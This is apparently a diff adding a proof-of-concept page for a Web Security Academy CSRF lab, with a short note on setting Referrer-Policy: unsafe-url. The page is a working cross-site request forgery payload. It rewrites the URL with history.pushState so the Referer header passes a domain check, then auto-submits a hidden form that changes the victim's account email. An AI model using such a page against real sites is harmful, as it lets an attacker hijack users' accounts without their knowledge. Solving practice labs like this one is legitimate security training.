@@ -1,0 +1,19 @@
+<html>
+
+
+<script>
+
+history.pushState("", "", "/?0a0a00b3035f86318184e38b0014003b.web-security-academy.net")
+</script>
+<body>
+    <form method="post" action="https://0a0a00b3035f86318184e38b0014003b.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="test@test.com">
+    </form>
+
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+you have to add Referrer-Policy: unsafe-url to the header because browers strip query strings from the referrer header.   
